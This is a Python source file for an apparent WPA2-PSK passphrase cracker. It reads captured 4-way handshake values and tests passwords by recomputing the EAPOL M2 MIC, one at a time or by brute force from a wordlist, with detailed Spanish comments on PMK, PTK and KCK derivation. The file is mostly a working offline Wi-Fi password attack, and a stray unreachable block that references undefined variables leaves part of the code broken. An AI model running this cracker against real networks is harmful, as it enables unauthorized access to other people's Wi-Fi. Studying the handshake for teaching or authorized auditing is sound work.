import hmac,hashlib
import scapy
from scapy.all import *
from pbkdf2 import PBKDF2
import binascii
import os

#######################################################################################
#
# BANNER
#

def banner():
    clear_screen()
    print(f"#################################################################################################")
    print(f"#                                                                                               #")
    print(f"#           {WHITE}@@@@@@@@@@@@@@@@@@{RESET}               ((_.-'-.| WPA2-PSK Password MIC Cracker |.-'-._))  #")
    print(f"#         {WHITE}@@@Fz3r0@@@@@@@@@@@@@@@{RESET}                                                               #")
    print(f"#       {WHITE}@@@@@@@@@@@@@@@@@@@@@@@@@@@{RESET}          - Offline WPA2-PSK Passphrase Bruteforce Attack -  #")
    print(f"#      {WHITE}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{RESET}                                                            #")
    print(f"#     {WHITE}@@@@@@@@@@@@@@@/      \\@@@/   @{RESET}        [+] Cyber-Weapon:............. WPA2-PSK Cracker    #")
    print(f"#    {WHITE}@@@@@@@@@@@@@@@@\\  {RED}O{WHITE}   @@  @ {RED}O{WHITE} @{RESET}        [+] Version:.................. 3.6                 #")
    print(f"#    {WHITE}@@@@@@@@@@@@@ @@@@@@@@@@  | \\@@@@@{RESET}      [+] Author:................... Fz3r0               #")
    print(f"#    {WHITE}@@@@@@@@@@@@@ @@@@@@@@@\\__@_/@@@@@{RESET}      [+] Github:................... github.com/Fz3r0    #")
    print(f"#     {WHITE}@@@@@@@@@@@@@@@/,/,/./'/_|.\\'\\,\\{RESET}       [+] Twitter:.................. @Fz3r0_OPs          #")
    print(f"#       {WHITE}@@@@@@@@@@@@@|  | | | | | | | |{RESET}      [+] Youtube:.................. @Fz3r0_OPs          #")
    print(f"#                   {WHITE}\\_|_|_|_|_|_|_|_|{RESET}                                                           #")
    print(f"#                                                                                               #")
    print(f"#################################################################################################")

#######################################################################################
#
# VARIABLES
#

## Variables que necesita el 4-Way-Handshake:
class WPA2Handshake:
    ssid = ''
    macAP = ''
    macCli = ''
    anonce = ''
    snonce = ''
    mic = ''
    passw = ''
    Eapol2frame = ''

## Function: Ingresar Valores de Variables en shell
def testData():

    ## Instructions
    print
    print(f"### INSTRUCTIONS:")
    print()
    print ("[!] IMPORTANT: To collect the data -> Open the .pcap frame capture of the WPA2-PSK (Personal) authentication in Blackshark and extract the following:")
    print()

    ## SSID   (Default: Fz3r0::CWAP
    print(f"[+] Paste the SSID of the WLAN               / or Press Enter to use Default  =  Fz3r0::CWAP") 
    WPA2Handshake.ssid        = input("->> ") or "Fz3r0::CWAP"

    ## AP     (Default: Telmex
    print(f"[+] Paste the WLAN Address of the AP (BSSID) / or Press Enter to use Default  =  50:4e:dc:90:2e:b8)")
    WPA2Handshake.macAP       = input("->> ") or "50:4e:dc:90:2e:b8"

    ## STA    (Default: Xiaomi Phone
    print(f"[+] Paste the WLAN Address of client STA    / or Press Enter to use Default   =  3c:13:5a:f2:46:88)")
    WPA2Handshake.macCli      = input("->> ") or "3c:13:5a:f2:46:88"

    ## Anonce (Default: M1 nonce (nonce from the AP/Authenticator)
    print(f"[+] Paste the Anonce - EAPOL M1 HEX Nonce - AP/Authenticator Nonce")
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {NEON_YELLOW}Hint: Copy 'HEX Stream' from Blackshark / Select EAPOL M1 Nonce, Right Click, Copy > As HEX Stream")
    WPA2Handshake.anonce      = input("->> ") or "f1b3a392f9a10693e031deb0edb996c27974f297c7963c005a5cd36116c80777"

    ## Snonce = M2 nonce (nonce from the STA/Supplicant)  
    print(f"[+] Paste the Snonce - EAPOL M2 HEX Nonce  - STA/Supplicant Nonce")
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} Hint: Copy 'HEX Stream' from Blackshark / Select EAPOL M2 Nonce, Right Click, Copy > As HEX Stream")
    WPA2Handshake.snonce      = input("->> ") or "a3911874480ff4e4b772c016d107ace5e0fb5fd972e5deeae1f662edeb8b4fc0"

    ## MIC   
    print("[+] Paste the MIC (e.g. EAPOL M2 MIC)  :: ")
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} Hint: Copy 'HEX Stream' from Blackshark / Select EAPOL M2 MIC, Right Click, Copy > As HEX Stream")
    WPA2Handshake.mic         = input("->> ") or "07d2e88db2254f675d349996ef95ad93"

    # EAPOL 2 Frame > Only Payload (No Headers or FCS)
    print(f"[+] Paste only the payload of EAPOL2 Frame in HEX (excuding MAC Header, LLC and FCS)")
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} Hint: To copy 'HEX stream' of EAPOL 2 frame payload, you should select ONLY the 802.1X Information Element of the M2 (the last 'directory' of the frame), you should NOT copy the entire 802.11 frame.")
    WPA2Handshake.Eapol2frame = input("->> ") or "0103007b02010a00000000000000000001a3911874480ff4e4b772c016d107ace5e0fb5fd972e5deeae1f662edeb8b4fc0000000000000000000000000000000000000000000000000000000000000000007d2e88db2254f675d349996ef95ad93001c301a0100000fac040100000fac040100000fac0280400000000fac06"

    banner()
 
# Visualize Variables in Shell
def viewdata():
    #print("\n=== Data for Offline Dictionary Attack on WPA2-PSK ===\n")
    
    # Introductory information about the data
    #print("[?] Data involved in offline dictionary attack on WPA2-PSK MIC:")
    #print("    - Includes SSID, Anonce, Snonce, MIC, and MAC addresses (Client STA and AP).")
    #print("    - Anonce, Snonce, and MIC are shared unencrypted in EAPOL frames M1 and M2.")
    #print("    - MAC Addresses and SSID can be captured during the handshake (or are pre-known).")
    #print("\n[!] Key Insight:")
    #print("    - The first two frames of the captured 4-way handshake (EAPOL M1 & M2) enable offline PSK guessing.\n")
    
    # Displaying captured 4-Way-Handshake data

    print("\n=================================================================================================\n")

    print(f"{BOLD}{WHITE}###{RED} EAPOL M1 & M2 data:{RESET}\n")

    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {NEON_YELLOW}4-Way-Handshake (EAPOL M1 & M2) data needed for MIC validation & cracking:{RESET}\n")
    
    # Mostrar cada elemento de datos de manera estructurada
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} SSID:............................. ", f"{PURPLE}{WPA2Handshake.ssid}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} MAC Address (AP):................. ", f"{TEAL}{str(WPA2Handshake.macAP)}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} MAC Address (STA):................ ", f"{ORANGE}{str(WPA2Handshake.macCli)}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} Anonce (AP):...................... ", f"{TEAL}{WPA2Handshake.anonce}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} Snonce (STA):..................... ", f"{ORANGE}{WPA2Handshake.snonce}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} MIC (EAPOL M2):................... ", f"{MAGENTA}{WPA2Handshake.mic}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} EAPOL M2 Payload:................. ", f"{CYAN}{WPA2Handshake.Eapol2frame}{RESET}")
    
    print("\n=================================================================================================\n")


#######################################################################################
#
# PIMP FUNCTIONS
#

# Colors Definitions
MAGENTA = '\033[95m'            # Magenta (neón)
CYAN = '\033[96m'               # Cian (neón)
YELLOW = '\033[93m'             # Amarillo (neón)
GREEN = '\033[92m'              # Verde (neón)
RED = '\033[91m'                # Rojo (neón)
WHITE = '\033[97m'              # Blanco brillante
LIME = '\033[38;5;10m'          # Lima (neón)
PURPLE = '\033[38;5;129m'       # Morado (neón)
ORANGE = '\033[38;5;214m'       # Naranja (neón)
BRIGHT_BLUE = '\033[38;5;81m'   # Azul brillante
PINK = '\033[38;5;213m'         # Rosa brillante
TEAL = '\033[38;5;38m'          # Teal (agua marina) brillante
NEON_YELLOW = '\033[38;5;226m'  # Amarillo neón
NEON_GREEN = '\033[38;5;46m'    # Verde neón
RESET = '\033[0m'               # Resetear color

# Colores adicionales para resaltar secciones importantes
BOLD = '\033[1m'


# Function: Clear Screen
def clear_screen():
    # Detect the operating system
    if os.name == 'nt':  # For Windows
        os.system('cls')
    else:  # For Linux and Mac
        os.system('clear')
             
####################################################################################################################
#
# Function: Algoritmo PRF512 (Para obtener PTK)

# Explicación general:
# Esta función realiza la operación de Pseudo-Random Function (PRF) utilizando el algoritmo HMAC-SHA1 para generar una salida de longitud fija (512 bits) 
# a partir de una clave (pmk), un texto (text), y datos adicionales (key_data). 
# Este tipo de función es fundamental en el proceso de creación de la Pairwise Transient Key (PTK) en el protocolo WPA2, 
# el cual se usa para cifrar las comunicaciones entre un dispositivo y el punto de acceso Wi-Fi.

def customPRF512(pmk, text, key_data):
    # Inicializamos el contador c, que se utilizará para iterar y modificar la entrada del HMAC-SHA1
    c = 0
    
    # Definimos el tamaño del bloque de salida que queremos obtener, 64 bytes (512 bits)
    block = 64
    
    # Creamos un objeto vacío de tipo bytes donde se acumularán los resultados del HMAC
    result = bytes()
    
    # Ejecutamos el ciclo mientras c sea menor o igual al número de iteraciones necesarias para generar los 512 bits.
    # El cálculo ((block * 8 + 159) / 160) nos da cuántas veces tenemos que generar un HMAC-SHA1 para cubrir los 512 bits,
    # ya que cada iteración genera 160 bits (20 bytes). La adición de 159 asegura que se redondee hacia arriba.
    while c <= ((block * 8 + 159) / 160):
        
        # Generamos un nuevo HMAC-SHA1 en cada iteración. 
        # La clave del HMAC es la pmk (Pairwise Master Key), derivada de la contraseña Wi-Fi.
        # El mensaje para el HMAC es la concatenación de:
        # 1. `text`, que es un valor que pasamos a la función.
        # 2. `chr(0x00).encode()`, que es un separador nulo en formato bytes.
        # 3. `key_data`, que es información adicional.
        # 4. `chr(c).encode()`, que es el valor del contador `c` convertido en un byte. Esto asegura que cada bloque generado sea único.
        hmacsha1 = hmac.new(pmk, text + chr(0x00).encode() + key_data + chr(c).encode(), hashlib.sha1)
        
        # El resultado de la función hmacsha1.digest() devuelve un bloque de 20 bytes (160 bits).
        # Vamos concatenando el resultado de cada iteración al objeto result.
        result = result + hmacsha1.digest()
        
        # Incrementamos el valor de c para la siguiente iteración, permitiendo que se genere un nuevo bloque.
        c += 1
    
    # Finalmente, devolvemos los primeros `block` bytes (64 bytes, 512 bits) del resultado acumulado.
    # Aunque generemos más de 512 bits, solo los primeros 512 bits son los que nos interesan.
    return result[:block]



# main
def main():
    while True:
        banner()
        print("\n=================================================================================================\n")
        print(f"{BOLD}{WHITE}###{RED} DISCLAIMER:{RESET}\n")
        print(f"{WHITE}[{RED}!{WHITE}]{RESET} 'WPA2-PSK Password MIC Cracker' is a tool designed for security audits on WPA2-PSK (Personal) IEEE 802.11 (Wi-Fi) networks.")
        print(f"{WHITE}[{RED}!{WHITE}]{RESET} The tool is developed exclusively for educational purposes and authorized ofensive security engagements.")
        print(f"{WHITE}[{RED}!{WHITE}]{RESET} Use is strictly limited to controlled environments (physical or virtual labs).")
        print(f"{WHITE}[{RED}!{WHITE}]{RESET} Rules of Engagement (RoE) and Non-Disclosure Agreements (NDAs) are strongly recommended for any external engagements.")        
        print(f"{WHITE}[{RED}!{WHITE}]{RESET} The author assume no responsibility for any misuse of this tool. Unauthorized or unethical usage is strictly discouraged.")
        print("\n=================================================================================================\n")
        print(f"{BOLD}{WHITE}###{RED} WELCOME TO WPA-PSK PASSWORD MIC CRACKER by Fz3r0!{RESET}")
        print()
        print(f"{YELLOW}Please select an option and press Enter to proceed...." + RESET)
        print()
        print(f"{WHITE}[{BRIGHT_BLUE}0{WHITE}]{RESET} Launch Fz3r0 MIC Cracker")
        print(f"{WHITE}[{BRIGHT_BLUE}9{WHITE}]{RESET} Exit")
        print()


        try:
            opt = int(input(f"{BOLD}{WHITE}->>{RESET} "))
            print()
            print("\n=================================================================================================\n")
            print()
            if opt == 9:
                print("Exiting... Goodbye!")
                exit()
            elif opt == 0:
                banner()
                testData()
                passmode()
            else:
                print("Invalid selection. Please enter 0 to launch the MIC Cracker or 9 to exit.")
        except ValueError:
            print("Error: Invalid input. Please enter a valid number (0 or 9).")

def passmode():
    while True:  # Start an infinite loop to keep showing the options until the user exits
        try:

            # Call ViewData Function: Display data related to the WPA2 handshake or relevant info 

            viewdata()  
            
            print(f"{BOLD}{WHITE}###{RED} ATTACK SELECTION:{RESET}")
            print()
            print("[0] - Manual Password Check")  # Option to check a password manually
            print("[1] - Bruteforce Password Attack")  # Option to start a brute-force attack
            print("[9] - Back to Main Menu")  # Option to go back to the main menu
            print()  # Adds an empty line for spacing
            
            # Prompt the user to select an option
            opt = int(input("->> Please select an option: "))  # Capture user input and convert it to an integer
            print()  # Adds an empty line after user input for better formatting

            # Handle the user's option
            if opt == 9:
                print("Returning to main menu...\n")  # Inform the user they are returning to the main menu
                main()  # Call the main function (presumably to go back to the main menu)
            elif opt == 1:
                print("Initiating Bruteforce attack...\n")  # Notify the user that brute-force attack is starting
                checkPasswdWordlist()  # Execute the brute-force attack (this function should be defined elsewhere)
            # Manual Password
            elif opt == 0:
                print("Please input the password you wish to audit or press Enter to use the default (Hunter2006).")  # Prompt to manually input a password
                WPA2Handshake.passw = input("--> ") or "Hunter2006"  # Allow user input, defaulting to "Hunter2006" if none is entered

                banner()
                viewdata()
                print(f"{BOLD}{WHITE}###{RED} Manual PSK Passphrase Selection:{RESET}\n")
                print(f"{WHITE}[{RED}!{WHITE}]{RESET} PSK Passphrase to Audit:..........  {RED}{WPA2Handshake.passw}{RESET}")  
                print("\n=================================================================================================\n")
                checkPasswd()  # Check the validity of the password (this function should be defined elsewhere)
            else:
                print("Invalid selection. Please enter a valid option (0, 1, or 9).\n")  # Inform the user of invalid input if it's not 0, 1, or 9
        except ValueError:  # Catch any ValueError if the input is not an integer
            print("Error: Invalid input. Please enter a valid number (0, 1, or 9).\n")  # Inform the user that their input is invalid










        # MAC AP: From EAPOL Mx
        macAPparsed = WPA2Handshake.macAP.replace(":","").lower()
        macAPparsed = binascii.a2b_hex(macAPparsed)
        macCliparsed = WPA2Handshake.macCli.replace(":","").lower()
        macCliparsed = binascii.a2b_hex(macCliparsed)
        anoncep = binascii.a2b_hex(WPA2Handshake.anonce)
        snoncep = binascii.a2b_hex(WPA2Handshake.snonce)
        key_data = min(macAPparsed,macCliparsed) + max(macAPparsed,macCliparsed)+ min(anoncep,snoncep)+ max(anoncep,snoncep)
        key_data = min(macAPparsed,macCliparsed) + max(macAPparsed,macCliparsed)+ min(anoncep,snoncep)+ max(anoncep,snoncep)
        txt = b"Pairwise key expansion"
        PTK = customPRF512(PMK,txt,key_data)
        KCK = PTK[0:16]
        eapol2data = WPA2Handshake.Eapol2frame[:162]+(32*"0")+WPA2Handshake.Eapol2frame[194:]
        calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]
        if calculated_mic.hex() == WPA2Handshake.mic:
            print("####################")
            print("# Password Correct #")
            print("####################")
            print("PW: "+str(l))
            print("")
 


def checkPasswd():

    ## CREAR Y MOSTRAR PMK

    print()
    print(F"{BOLD}{WHITE}###{RED} PMK (Pairwise Master Key) DERIVATION || PBKDF2 KDF (Key Derivation Function):")
    print()
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {YELLOW}PMK = 256-bit Key derived from Passphrase & SSID using PBKDF2, provides the foundation for RSNA keys in WPA2 authentication." + RESET)    
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {YELLOW}The PMK derives the PTK, which divides into -> KCK for MIC integrity; KEK for EAPOL message encryption; TK for data encryption; and MIC keys for data integrity." + RESET)    
    print() 
    print(f"{BOLD}{WHITE}PMK Formula -->{RESET} {BOLD} {GREEN}PBKDF2 {WHITE}= {WHITE}({RED}Passphrase {WHITE}+ {PURPLE}SSID{WHITE}) & {CYAN}4096 iterations >> {PINK}read(32byte){RESET}")
    print("")
    print(f"{BOLD}{WHITE}PMK ={RESET} ({RED}{WPA2Handshake.passw}{WHITE} + {PURPLE}{WPA2Handshake.ssid}{WHITE}) &  {CYAN}4096 iterations >> {PINK}read(32byte){RESET}  ")
    print("")

    # Formula para PMK:
    PMK = PBKDF2(WPA2Handshake.passw, WPA2Handshake.ssid, 4096).read(32)

    # Imprimir PMK:
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} PMK:................... " + str(PMK.hex()))
    print()

    ##########################################################################

  
    ## CREAR Y MOSTRAR PTK

    print()
    print("[+]Generating PTK...")
    print()

    ## Proceso para generar la PTK
    print("[-] Generating key_data...")
    print()

    ## 1. Extraer MAC de AP y quitar ":" para la operación
    macAPparsed = WPA2Handshake.macAP.replace(":","").lower()
    macAPparsed = binascii.a2b_hex(macAPparsed)
    
    ## 2. Extraer MAC de STA y quitar ":" para la operación
    macCliparsed = WPA2Handshake.macCli.replace(":","").lower()
    macCliparsed = binascii.a2b_hex(macCliparsed)
    
    ## 3. Extraer Anonce (AP) de M1 EAPOL
    anoncep = binascii.a2b_hex(WPA2Handshake.anonce)

    ## 4. Extraer Snonce (STA) de M1 EAPOL
    snoncep = binascii.a2b_hex(WPA2Handshake.snonce)

    ## 5. Calcular y concatenar el Key Data
    key_data = min(macAPparsed,macCliparsed) + max(macAPparsed,macCliparsed)+ min(anoncep,snoncep)+ max(anoncep,snoncep)

    # Variable "txt"
    txt = b"Pairwise key expansion"

    # Imprimir Key Data en HEx
    print("key data: "+binascii.b2a_hex(key_data).decode())
    print()


    print("[-] Running PRF512 algorithm...")
    print()

    PTK = customPRF512(PMK,txt,key_data)
    print("Pairwise Temporal Key (PTK): " + str(PTK.hex()))
    print()




    #################################################################################################
    #
  
    ## CALCULAR Y MOSTRAR MIC

    # Esta función está realizando un ataque tipo "offline handshake", 
    # en el cual se intenta calcular el MIC con una clave propuesta (derivada del PTK), 
    # y compararlo con el MIC del paquete capturado (EAPOL frame).

    # Muestra un mensaje indicando que se está empezando el cálculo del MIC. 
    print()
    print("######################")    
    print("#                    #") 
    print("#   Calculando MIC   #")
    print("#                    #") 
    print("######################") 
    print()

    
    # 1. ExtraER KCK del PTK y mostrarla:
    print("1. ExtraER KCK del PTK:") 
    print("    - Se extrae la KCK (Key Confirmation Key) de los primeros 16 bytes del PTK (Pairwise Transient Key).")
    print("    - La KCK siempre tiene una longitud de 16 bytes, que es suficiente para la generación del MIC.")
    print()
    print("[*] KCK: ")
    KCK = PTK[0:16]
    print(KCK)
    print()

    
    # 2. Poner en 0 en valor del MIC
    print("2. Poner en 0 en valor del MIC") 
    print("    - Para poder recalcular el MIC, el campo que lo contiene en el mensaje debe 'anularse' (o 'poner a cero') antes de hacer el cálculo.") 
    print("    - Si no se pusiera en 0, no se podría recalcular el MIC ya que el valor anterior interferiría.")  
    print("    - De esta manera, el cálculo solo se basará en los otros datos del frame, junto con la Passphrase que estás probando.") 
    print()

    # * Formula para poner en 0 (anular) el valor del MIC calculado:
        # - WPA2Handshake.Eapol2frame[:162] : Toma los primeros 162 bytes del frame original antes del campo MIC.
        # - 32*"0" :                          Reemplaza el campo MIC con 32 caracteres "0" (equivalente a 16 bytes en hexadecimal).
        # - WPA2Handshake.Eapol2frame[194:]:  Toma el resto del frame después del campo MIC, desde el byte 194 hasta el final.
        #     ** Esto crea una copia del frame EAPOL donde el campo MIC está lleno de ceros, lo que te permite recalcularlo desde cero correctamente.
    eapol2data = WPA2Handshake.Eapol2frame[:162]+(32*"0")+WPA2Handshake.Eapol2frame[194:]

    # * Muestra el frame EAPOL antes de ser modificado, lo cual es útil para verificar que estamos trabajando con el frame correcto. 
    #   Esto es para fines de depuración

    # * Muestra el frame EAPOL antes de ser modificado, resaltando el MIC en magenta
    print("[-] EAPOL M2 (Message 2) :: Antes de poner a 0 el MIC:")

    # Imprimimos la primera parte (sin cambios)
    print(WPA2Handshake.Eapol2frame[:162], end="")

    # Imprimimos el valor original del MIC en magenta
    print(f"{MAGENTA}{WPA2Handshake.Eapol2frame[162:194]}{RESET}", end="")

    # Imprimimos el resto del frame (sin cambios)
    print(WPA2Handshake.Eapol2frame[194:])
    print()

    # * Formula para poner en 0 (anular) el valor del MIC calculado:
    #   - WPA2Handshake.Eapol2frame[:162] : Toma los primeros 162 bytes del frame original antes del campo MIC.
    #   - 32*"0" :                          Reemplaza el campo MIC con 32 caracteres "0" (equivalente a 16 bytes en hexadecimal).
    #   - WPA2Handshake.Eapol2frame[194:]:  Toma el resto del frame después del campo MIC, desde el byte 194 hasta el final.
    eapol2data = WPA2Handshake.Eapol2frame[:162] + (32 * "0") + WPA2Handshake.Eapol2frame[194:]

    # * Muestra el frame EAPOL después de ser modificado, resaltando los ceros en magenta
    print("[-] EAPOL M2 (Message 2) :: Después de poner a 0 el MIC:")

    # Imprimimos la primera parte (sin cambios)
    print(WPA2Handshake.Eapol2frame[:162], end="")

    # Imprimimos los 32 ceros reemplazados en color magenta
    print(f"{MAGENTA}{'0' * 32}{RESET}", end="")

    # Imprimimos el resto del frame (sin cambios)
    print(WPA2Handshake.Eapol2frame[194:])
    print()

    # 3. Calcular el MIC
    # - Muestra que ahora se va a proceder con el cálculo del MIC.
    print("    [2] Calculando MIC desde 0 utilizando HMAC y KCK como clave para el algoritmo HMAC:")
    print("")
    
    # * Formula para calcular MIC
    # - Descripción:                  Aquí se está calculando el MIC utilizando HMAC (Hash-based Message Authentication Code) .
    #                                 MIC = {hmac (KCK, EAPOL 2 Frame con MIC en 0, hashlib.sha1)}
    # -                               Se utiliza la KCK como clave para el algoritmo HMAC.
    # - binascii.a2b_hex(eapol2data): Convierte la versión hexadecimal del eapol2data en formato binario, que es lo que espera el algoritmo HMAC.
    # - hashlib.sha1:                 Se utiliza SHA-1 como función hash para generar el HMAC.
    # - .digest()[:16]:               El resultado de digest() genera un hash de 20 bytes (SHA-1), pero solo se toman los primeros 16 bytes porque es el tamaño requerido para el MIC.
    calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]

    # 5. Calcular el MIC
    print("        [*] MIC Calculada :  "+str(calculated_mic.hex()))
    print("        [*] MIC capturada :  "+str(WPA2Handshake.mic))
    print("")


    # 6. Comparar ambos MIC, si coinciden será password correcto
    if calculated_mic.hex() == WPA2Handshake.mic:
        print("")
        print("####################")
        print("# Password Correct #")
        print("####################")
        print("")

    else: 
        print("")
        print("######################")
        print("# Password Incorrect #")
        print("######################")
        print("") 
        
     # Preguntar al usuario qué desea hacer
    print("What would you like to do next?")
    print("1. Go to main")
    print("2. Try another password")
    print("3. Exit")
    
    choice = input("Please enter a number (1-3): ").strip()

    if choice == "1":
        main()  # Go to the main function
    elif choice == "2":
        checkPasswd()  # Retry the password check
    elif choice == "3":
        print("Exiting program...")
        exit()  # Exit the program
    else:
        print("Invalid choice. Exiting program.")
        exit()  # Exit if invalid choice   






def checkPasswdWordlist():


    # Solicitar la ruta del wordlist si se desea cambiar el default
    wordlist_path = input("Ingrese la ruta del wordlist (presione Enter para usar '/usr/share/wordlists/rockyou.txt'): ")
    if not wordlist_path:
        wordlist_path = '/home/fz3r0/Documents/4-way-handshake-generator/popo.txt'

    # Verificar que el archivo de wordlist existe
    if not os.path.isfile(wordlist_path):
        print(f"No se encontró el archivo de wordlist en: {wordlist_path}")
        return

    # Leer el wordlist y probar cada palabra como contraseña
    with open(wordlist_path, 'r', encoding='latin-1') as wordlist_file:
        for passw_wordlist in wordlist_file:
            passw_wordlist = passw_wordlist.strip()  # Quitar espacios en blanco

            print()
            print(f"Probando contraseña: {passw_wordlist}")
            print()

            # Generar PMK
            print("\n[+] Generating PMK via PBKDF2...\n")
            PMK = PBKDF2(passw_wordlist, WPA2Handshake.ssid, 4096).read(32)
            print("Pairwise Master Key (PMK): " + str(PMK.hex()) + "\n")

            # Generar PTK
            print("\n[+] Generating PTK...\n")
            macAPparsed = binascii.a2b_hex(WPA2Handshake.macAP.replace(":", "").lower())
            macCliparsed = binascii.a2b_hex(WPA2Handshake.macCli.replace(":", "").lower())
            anoncep = binascii.a2b_hex(WPA2Handshake.anonce)
            snoncep = binascii.a2b_hex(WPA2Handshake.snonce)
            key_data = min(macAPparsed, macCliparsed) + max(macAPparsed, macCliparsed) + min(anoncep, snoncep) + max(anoncep, snoncep)
            txt = b"Pairwise key expansion"
            PTK = customPRF512(PMK, txt, key_data)
            print("Pairwise Temporal Key (PTK): " + str(PTK.hex()) + "\n")

            # Calcular y mostrar MIC
            print("\n######################")    
            print("#   Calculando MIC   #")
            print("######################\n")
            KCK = PTK[0:16]
            eapol2data = WPA2Handshake.Eapol2frame[:162] + (32 * "0") + WPA2Handshake.Eapol2frame[194:]
            calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]
            print("MIC Calculada:  " + str(calculated_mic.hex()))
            print("MIC capturada:  " + str(WPA2Handshake.mic) + "\n")

            # Comparar MICs
            if calculated_mic.hex() == WPA2Handshake.mic:
                print(f"\n####################")
                print(f"# Password Correct!!! -->> {passw_wordlist} #")
                print(f"####################\n")
                input("Presiona Enter para salir...")  # Pausar la ejecución hasta que el usuario presione Enter
                return  # Detener la función si se encuentra la contraseña correcta

            else:
                print("\n######################")
                print("# Password Incorrect #")
                print("######################\n")
                banner()






if __name__ == "__main__":
    main()
